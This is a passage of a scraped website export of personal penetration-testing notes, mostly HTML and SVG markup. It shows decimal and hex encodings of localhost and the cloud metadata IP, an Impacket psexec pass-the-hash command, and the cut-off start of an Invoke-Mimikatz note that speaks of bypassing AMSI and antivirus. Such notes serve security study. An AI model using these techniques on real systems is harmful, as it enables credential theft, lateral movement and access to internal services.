transform=&quot;translate(1778,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(2278,0)&quot;&gt;&lt;use data-c=&quot;2E&quot; xlink:href=&quot;#MJX-1-TEX-N-2E&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot; transform=&quot;translate(278,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(3056,0)&quot;&gt;&lt;use data-c=&quot;2E&quot; xlink:href=&quot;#MJX-1-TEX-N-2E&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot; transform=&quot;translate(278,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mtd&quot; transform=&quot;translate(3834,0)&quot;&gt;&lt;g data-mml-node=&quot;mi&quot;&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(277.8,0)&quot;&gt;&lt;use data-c=&quot;3D&quot; xlink:href=&quot;#MJX-1-TEX-N-3D&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(1333.6,0)&quot;&gt;&lt;use data-c=&quot;28&quot; xlink:href=&quot;#MJX-1-TEX-N-28&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(1722.6,0)&quot;&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot; transform=&quot;translate(500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;37&quot; xlink:href=&quot;#MJX-1-TEX-N-37&quot; transform=&quot;translate(1000,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(3444.8,0)&quot;&gt;&lt;use data-c=&quot;D7&quot; xlink:href=&quot;#MJX-1-TEX-N-D7&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;msup&quot; transform=&quot;translate(4445,0)&quot;&gt;&lt;g data-mml-node=&quot;mn&quot;&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;TeXAtom&quot; transform=&quot;translate(533,413) scale(0.707)&quot; data-mjx-texclass=&quot;ORD&quot;&gt;&lt;g data-mml-node=&quot;mn&quot;&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;34&quot; xlink:href=&quot;#MJX-1-TEX-N-34&quot; transform=&quot;translate(500,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(5735.1,0)&quot;&gt;&lt;use data-c=&quot;29&quot; xlink:href=&quot;#MJX-1-TEX-N-29&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(6346.3,0)&quot;&gt;&lt;use data-c=&quot;2B&quot; xlink:href=&quot;#MJX-1-TEX-N-2B&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(7346.6,0)&quot;&gt;&lt;use data-c=&quot;28&quot; xlink:href=&quot;#MJX-1-TEX-N-28&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(7735.6,0)&quot;&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(8457.8,0)&quot;&gt;&lt;use data-c=&quot;D7&quot; xlink:href=&quot;#MJX-1-TEX-N-D7&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;msup&quot; transform=&quot;translate(9458,0)&quot;&gt;&lt;g data-mml-node=&quot;mn&quot;&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;TeXAtom&quot; transform=&quot;translate(533,413) scale(0.707)&quot; data-mjx-texclass=&quot;ORD&quot;&gt;&lt;g data-mml-node=&quot;mn&quot;&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;36&quot; xlink:href=&quot;#MJX-1-TEX-N-36&quot; transform=&quot;translate(500,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(10748.1,0)&quot;&gt;&lt;use data-c=&quot;29&quot; xlink:href=&quot;#MJX-1-TEX-N-29&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(11359.3,0)&quot;&gt;&lt;use data-c=&quot;2B&quot; xlink:href=&quot;#MJX-1-TEX-N-2B&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(12359.5,0)&quot;&gt;&lt;use data-c=&quot;28&quot; xlink:href=&quot;#MJX-1-TEX-N-28&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(12748.5,0)&quot;&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(13470.8,0)&quot;&gt;&lt;use data-c=&quot;D7&quot; xlink:href=&quot;#MJX-1-TEX-N-D7&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;msup&quot; transform=&quot;translate(14471,0)&quot;&gt;&lt;g data-mml-node=&quot;mn&quot;&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(533,413) scale(0.707)&quot;&gt;&lt;use data-c=&quot;38&quot; xlink:href=&quot;#MJX-1-TEX-N-38&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(15407.5,0)&quot;&gt;&lt;use data-c=&quot;29&quot; xlink:href=&quot;#MJX-1-TEX-N-29&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(16018.8,0)&quot;&gt;&lt;use data-c=&quot;2B&quot; xlink:href=&quot;#MJX-1-TEX-N-2B&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(17019,0)&quot;&gt;&lt;use data-c=&quot;28&quot; xlink:href=&quot;#MJX-1-TEX-N-28&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(17408,0)&quot;&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(18130.2,0)&quot;&gt;&lt;use data-c=&quot;D7&quot; xlink:href=&quot;#MJX-1-TEX-N-D7&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;msup&quot; transform=&quot;translate(19130.4,0)&quot;&gt;&lt;g data-mml-node=&quot;mn&quot;&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(533,413) scale(0.707)&quot;&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(20067,0)&quot;&gt;&lt;use data-c=&quot;29&quot; xlink:href=&quot;#MJX-1-TEX-N-29&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mtr&quot; transform=&quot;translate(0,-70.9)&quot;&gt;&lt;g data-mml-node=&quot;mtd&quot; transform=&quot;translate(3834,0)&quot;&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mtd&quot; transform=&quot;translate(3834,0)&quot;&gt;&lt;g data-mml-node=&quot;mi&quot;&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(277.8,0)&quot;&gt;&lt;use data-c=&quot;3D&quot; xlink:href=&quot;#MJX-1-TEX-N-3D&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(1333.6,0)&quot;&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot; transform=&quot;translate(500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;33&quot; xlink:href=&quot;#MJX-1-TEX-N-33&quot; transform=&quot;translate(1000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot; transform=&quot;translate(1500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;37&quot; xlink:href=&quot;#MJX-1-TEX-N-37&quot; transform=&quot;translate(2000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot; transform=&quot;translate(2500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;36&quot; xlink:href=&quot;#MJX-1-TEX-N-36&quot; transform=&quot;translate(3000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;34&quot; xlink:href=&quot;#MJX-1-TEX-N-34&quot; transform=&quot;translate(3500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;33&quot; xlink:href=&quot;#MJX-1-TEX-N-33&quot; transform=&quot;translate(4000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot; transform=&quot;translate(4500,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(6555.8,0)&quot;&gt;&lt;use data-c=&quot;2B&quot; xlink:href=&quot;#MJX-1-TEX-N-2B&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(7556,0)&quot;&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(8278.2,0)&quot;&gt;&lt;use data-c=&quot;2B&quot; xlink:href=&quot;#MJX-1-TEX-N-2B&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(9278.4,0)&quot;&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(10000.7,0)&quot;&gt;&lt;use data-c=&quot;2B&quot; xlink:href=&quot;#MJX-1-TEX-N-2B&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(11000.9,0)&quot;&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mtr&quot; transform=&quot;translate(0,-1370.9)&quot;&gt;&lt;g data-mml-node=&quot;mtd&quot; transform=&quot;translate(3834,0)&quot;&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mtd&quot; transform=&quot;translate(3834,0)&quot;&gt;&lt;g data-mml-node=&quot;mi&quot;&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mo&quot; transform=&quot;translate(277.8,0)&quot;&gt;&lt;use data-c=&quot;3D&quot; xlink:href=&quot;#MJX-1-TEX-N-3D&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(1333.6,0)&quot;&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot; transform=&quot;translate(500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;33&quot; xlink:href=&quot;#MJX-1-TEX-N-33&quot; transform=&quot;translate(1000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot; transform=&quot;translate(1500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;37&quot; xlink:href=&quot;#MJX-1-TEX-N-37&quot; transform=&quot;translate(2000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot; transform=&quot;translate(2500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;36&quot; xlink:href=&quot;#MJX-1-TEX-N-36&quot; transform=&quot;translate(3000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;34&quot; xlink:href=&quot;#MJX-1-TEX-N-34&quot; transform=&quot;translate(3500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;33&quot; xlink:href=&quot;#MJX-1-TEX-N-33&quot; transform=&quot;translate(4000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;33&quot; xlink:href=&quot;#MJX-1-TEX-N-33&quot; transform=&quot;translate(4500,0)&quot;&gt;&lt;/use&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/svg&gt;&lt;/mjx-container&gt;\n&lt;p&gt;Converting to hexadecimal is trivial using the excellent &lt;a href=&quot;https://qalculate.github.io/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Qalculate!&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; tool.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;qalc&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;qalc&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;2130706433 to hex = 0x7F000001&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;common-addresses&quot;&gt;Common addresses&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#common-addresses&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;localhost&quot;&gt;localhost&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#localhost&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre&gt;&lt;code&gt;localhost → 127.0.0.1 → 0x7f000001 → 2130706433\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=&quot;server-metadata&quot;&gt;Server metadata&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#server-metadata&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;169.254.169.254 is often used in to reference configuration data in cloud systems (just AWS?).&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;169.254.169.254 → 0xa9fea9fe → 2852039166\n&lt;/code&gt;&lt;/pre&gt;&lt;style&gt;\nmjx-container[jax=&quot;SVG&quot;] {\n  direction: ltr;\n}\n\nmjx-container[jax=&quot;SVG&quot;] &gt; svg {\n  overflow: visible;\n  min-height: 1px;\n  min-width: 1px;\n}\n\nmjx-container[jax=&quot;SVG&quot;] &gt; svg a {\n  fill: blue;\n  stroke: blue;\n}\n\nmjx-container[jax=&quot;SVG&quot;][display=&quot;true&quot;] {\n  display: block;\n  text-align: center;\n  margin: 1em 0;\n}\n\nmjx-container[jax=&quot;SVG&quot;][display=&quot;true&quot;][width=&quot;full&quot;] {\n  display: flex;\n}\n\nmjx-container[jax=&quot;SVG&quot;][justify=&quot;left&quot;] {\n  text-align: left;\n}\n\nmjx-container[jax=&quot;SVG&quot;][justify=&quot;right&quot;] {\n  text-align: right;\n}\n\ng[data-mml-node=&quot;merror&quot;] &gt; g {\n  fill: red;\n  stroke: red;\n}\n\ng[data-mml-node=&quot;merror&quot;] &gt; rect[data-background] {\n  fill: yellow;\n  stroke: none;\n}\n\ng[data-mml-node=&quot;mtable&quot;] &gt; line[data-line], svg[data-table] &gt; g &gt; line[data-line] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node=&quot;mtable&quot;] &gt; rect[data-frame], svg[data-table] &gt; g &gt; rect[data-frame] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node=&quot;mtable&quot;] &gt; .mjx-dashed, svg[data-table] &gt; g &gt; .mjx-dashed {\n  stroke-dasharray: 140;\n}\n\ng[data-mml-node=&quot;mtable&quot;] &gt; .mjx-dotted, svg[data-table] &gt; g &gt; .mjx-dotted {\n  stroke-linecap: round;\n  stroke-dasharray: 0,140;\n}\n\ng[data-mml-node=&quot;mtable&quot;] &gt; g &gt; svg {\n  overflow: visible;\n}\n\n[jax=&quot;SVG&quot;] mjx-tool {\n  display: inline-block;\n  position: relative;\n  width: 0;\n  height: 0;\n}\n\n[jax=&quot;SVG&quot;] mjx-tool &gt; mjx-tip {\n  position: absolute;\n  top: 0;\n  left: 0;\n}\n\nmjx-tool &gt; mjx-tip {\n  display: inline-block;\n  padding: .2em;\n  border: 1px solid #888;\n  font-size: 70%;\n  background-color: #F8F8F8;\n  color: black;\n  box-shadow: 2px 2px 5px #AAAAAA;\n}\n\ng[data-mml-node=&quot;maction&quot;][data-toggle] {\n  cursor: pointer;\n}\n\nmjx-status {\n  display: block;\n  position: fixed;\n  left: 1em;\n  bottom: 1em;\n  min-width: 25%;\n  padding: .2em .4em;\n  border: 1px solid #888;\n  font-size: 90%;\n  background-color: #F8F8F8;\n  color: black;\n}\n\nforeignObject[data-mjx-xml] {\n  font-family: initial;\n  line-height: normal;\n  overflow: visible;\n}\n\nmjx-container[jax=&quot;SVG&quot;] path[data-c], mjx-container[jax=&quot;SVG&quot;] use[data-c] {\n  stroke-width: 3;\n}\n&lt;/style&gt;"},"spells/Impacket":{"slug":"spells/Impacket","filePath":"spells/Impacket.md","title":"Impacket","links":["spells/Kerberoasting-with-Impacket","spells/AS-REP-roasting-with-Impacket"],"tags":["Application/Impacket","Application/PsExec","Protocol/Kerberos","OS/Windows/ActiveDirectory"],"content":"Kerberoasting\nTransclude of Kerberoasting-with-Impacket\nAS-REP roasting\nTransclude of AS-REP-roasting-with-Impacket\nPsExec\nImpacket includes a reimplementation of PsExec. Under Linux (but not Windows) you can pass in an NTLM hash instead of a password for the target user.\n# Psexec.py (but ONLY on Linux; this won&#039;t work on Windows!)\n#\npsexec.py -hashes $TARGET_USER_NTLM_HASH \\\n                  $TARGET_DOMAIN\\$TARGET_USER@$TARGET_HOST","richContent":"&lt;h2 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#kerberoasting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Kerberoasting-with-Impacket&quot; data-block=&quot;&quot; data-embed-alias=&quot;Kerberoasting with Impacket&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberoasting-with-Impacket&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Kerberoasting-with-Impacket&quot;&gt;Transclude of Kerberoasting-with-Impacket&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;as-rep-roasting&quot;&gt;AS-REP roasting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#as-rep-roasting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;AS-REP-roasting-with-Impacket&quot; data-block=&quot;&quot; data-embed-alias=&quot;AS-REP roasting with Impacket&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/AS-REP-roasting-with-Impacket&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/AS-REP-roasting-with-Impacket&quot;&gt;Transclude of AS-REP-roasting-with-Impacket&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;psexec&quot;&gt;PsExec&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#psexec&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Impacket includes a reimplementation of &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/psexec&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;PsExec&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. Under Linux (but &lt;em&gt;not&lt;/em&gt; Windows) you can pass in an NTLM hash instead of a password for the target user.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Psexec.py (but ONLY on Linux; this won&#039;t work on Windows!)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;psexec.py&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -hashes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_USER_NTLM_HASH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                  $TARGET_DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;TARGET_USER@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_HOST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Invoke-Mimikatz":{"slug":"spells/Invoke-Mimikatz","filePath":"spells/Invoke-Mimikatz.md","title":"Invoke-Mimikatz","links":["spells/Mimikatz"],"tags":["Application/PowerShell/Invoke-Mimikatz","AttackCycle/PrivEsc","AttackCycle/LateralMovement","Protocol/Kerberos","OS/Windows/ActiveDirectory","AttackCycle/Reconnaissance","AttackCycle/PrivEsc/PassTheHash","AttackCycle/LateralMovement/PassTheHash"],"content":"Mimikatz binaries are generally detected by AV on download these days, but fortunately there’s a PowerShell re-implementation available from the Empire Project that can be run after bypassing AMSI.\nInvoke-Mimikatz -Command &#039;&quot;privilege::debug&quot; 